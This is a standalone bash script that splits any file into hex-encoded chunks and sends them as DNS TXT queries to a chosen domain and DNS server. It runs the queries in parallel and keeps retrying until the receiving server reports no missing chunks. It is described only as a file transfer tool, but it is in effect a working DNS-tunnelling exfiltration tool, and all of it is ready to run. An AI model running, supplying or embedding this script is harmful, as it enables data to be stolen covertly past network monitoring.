#!/bin/bash

# Script to break a file into chunks and send via DNS queries
# Usage: ./script.sh <file> [domain] [chunk_size] [dns_server]

set -e

if [ $# -lt 1 ]; then
    echo "Usage: $0 <file> [domain] [chunk_size] [dns_server]"
    echo "  file: File to transfer"
    echo "  domain: Domain suffix (default: example.com)"
    echo "  chunk_size: Size of each chunk in bytes (default: 100)"
    echo "  dns_server: DNS server IP (default: system default)"
    exit 1
fi

FILE="$1"
DOMAIN="${2:-example.com}"
CHUNK_SIZE="${3:-100}"
DNS_SERVER="${4:-}"

# Check if file exists
if [ ! -f "$FILE" ]; then
    echo "Error: File '$FILE' not found"
    exit 1
fi

# Get filename (basename only)
FILENAME=$(basename "$FILE")

# Generate hash8 (8 hex characters) - using first 8 chars of file's md5
HASH8=$(md5sum "$FILE" | cut -d' ' -f1 | cut -c1-8)

# Encode filename to hex
FILENAME_HEX=$(echo -n "$FILENAME" | xxd -p | tr -d '\n')

# Get file size
FILE_SIZE=$(stat -f%z "$FILE" 2>/dev/null || stat -c%s "$FILE" 2>/dev/null || wc -c < "$FILE")

# Calculate total parts
TOTAL_PARTS=$(( (FILE_SIZE + CHUNK_SIZE - 1) / CHUNK_SIZE ))

echo "File: $FILE"
echo "Filename: $FILENAME"
echo "Size: $FILE_SIZE bytes"
echo "Chunk size: $CHUNK_SIZE bytes"
echo "Total parts: $TOTAL_PARTS"
echo "Hash: $HASH8"
echo "Domain: $DOMAIN"
echo ""

# Maximum number of parallel DNS queries (adjust based on your system)
MAX_PARALLEL=${MAX_PARALLEL:-20}

# Function to split hex string into DNS labels (max 63 chars per label)
split_hex_labels() {
    local hex_str="$1"
    local result=""
    local len=${#hex_str}
    local i=0
    
    while [ $i -lt $len ]; do
        if [ -n "$result" ]; then
            result="${result}."
        fi
        result="${result}${hex_str:$i:63}"
        i=$((i + 63))
    done
    
    echo "$result"
}

# Build start record query
# Format: filename_hex.total_parts.chunk_size.total_bytes.start.hash8.<domain>
FILENAME_HEX_LABELS=$(split_hex_labels "$FILENAME_HEX")
START_QUERY="${FILENAME_HEX_LABELS}.${TOTAL_PARTS}.${CHUNK_SIZE}.${FILE_SIZE}.start.${HASH8}.${DOMAIN}"

echo "Sending start record..."
if [ -z "$DNS_SERVER" ]; then
    dig +short "$START_QUERY" TXT > /dev/null 2>&1 || true
else
    dig +short @"$DNS_SERVER" "$START_QUERY" TXT > /dev/null 2>&1 || true
fi
sleep 0.1

# Function to send a single DNS query (used in parallel)
send_dns_query() {
    local part_num=$1
    local chunk_offset=$2
    local chunk_size=$3
    local hash8=$4
    local domain=$5
    local dns_server=$6
    local file=$7
    
    # Read chunk and encode to hex in one step (avoid null byte warning)
    local chunk_hex=$(dd if="$file" bs=1 skip=$chunk_offset count=$chunk_size 2>/dev/null | xxd -p | tr -d '\n')
    
    # Split hex into DNS labels
    local chunk_hex_labels=$(split_hex_labels "$chunk_hex")
    
    # Build data record query
    # Format: data_hex.part_num.hash8.<domain>
    local data_query="${chunk_hex_labels}.${part_num}.${hash8}.${domain}"
    
    # Send DNS query
    if [ -z "$dns_server" ]; then
        dig +short "$data_query" TXT > /dev/null 2>&1 || true
    else
        dig +short @"$dns_server" "$data_query" TXT > /dev/null 2>&1 || true
    fi
}

# Read file and send chunks in parallel (1-based part numbering)
echo "Sending chunks in parallel (max $MAX_PARALLEL concurrent queries)..."
PART_NUM=1
BYTES_READ=0
JOBS=0

while [ $BYTES_READ -lt $FILE_SIZE ]; do
    # Wait if we've reached max parallel jobs
    while [ $(jobs -r | wc -l) -ge $MAX_PARALLEL ]; do
        sleep 0.01
    done
    
    # Start DNS query in background
    (
        send_dns_query "$PART_NUM" "$BYTES_READ" "$CHUNK_SIZE" "$HASH8" "$DOMAIN" "$DNS_SERVER" "$FILE"
        echo "Part $PART_NUM/$TOTAL_PARTS sent"
    ) &
    
    BYTES_READ=$((BYTES_READ + CHUNK_SIZE))
    PART_NUM=$((PART_NUM + 1))
done

# Wait for all background jobs to complete
wait

echo ""
echo "Initial transfer complete! Sent $TOTAL_PARTS parts."

# Check for missing chunks and retry (retry indefinitely until all chunks are received)
RETRY_COUNT=0

while true; do
    # Wait 1 second for server to process
    sleep 1
    
    # Query for missing chunks with counter prefix to avoid DNS caching
    MISSING_QUERY="${RETRY_COUNT}.missing.${HASH8}.${DOMAIN}"
    echo "Checking for missing chunks..."
    
    if [ -z "$DNS_SERVER" ]; then
        MISSING_RESPONSE=$(dig +short "$MISSING_QUERY" TXT 2>/dev/null || echo "")
    else
        MISSING_RESPONSE=$(dig +short @"$DNS_SERVER" "$MISSING_QUERY" TXT 2>/dev/null || echo "")
    fi
    
    # Parse missing chunk numbers from TXT records
    # TXT records are returned as quoted strings like "2" "5" "7"
    MISSING_CHUNKS=$(echo "$MISSING_RESPONSE" | grep -oE '"[0-9]+"' | tr -d '"' | sort -n)
    
    if [ -z "$MISSING_CHUNKS" ]; then
        echo "All chunks received successfully!"
        break
    fi
    
    # Count missing chunks
    MISSING_COUNT=$(echo "$MISSING_CHUNKS" | wc -l)
    RETRY_COUNT=$((RETRY_COUNT + 1))
    echo "Found $MISSING_COUNT missing chunk(s): $(echo $MISSING_CHUNKS | tr '\n' ' ')"
    echo "Retry attempt $RETRY_COUNT: Retrying missing chunks in parallel..."
    
    # Retry sending missing chunks in parallel (1-based, so subtract 1 for offset)
    for chunk_num in $MISSING_CHUNKS; do
        # Wait if we've reached max parallel jobs
        while [ $(jobs -r | wc -l) -ge $MAX_PARALLEL ]; do
            sleep 0.01
        done
        
        # Calculate byte offset for this chunk (1-based part number, so subtract 1)
        chunk_offset=$(((chunk_num - 1) * CHUNK_SIZE))
        
        # Start DNS query in background
        (
            send_dns_query "$chunk_num" "$chunk_offset" "$CHUNK_SIZE" "$HASH8" "$DOMAIN" "$DNS_SERVER" "$FILE"
            echo "  Chunk $chunk_num retried"
        ) &
    done
    
    # Wait for all retry jobs to complete
    wait
    echo ""
done

echo ""
echo "Transfer complete! File should be received as: $FILENAME"

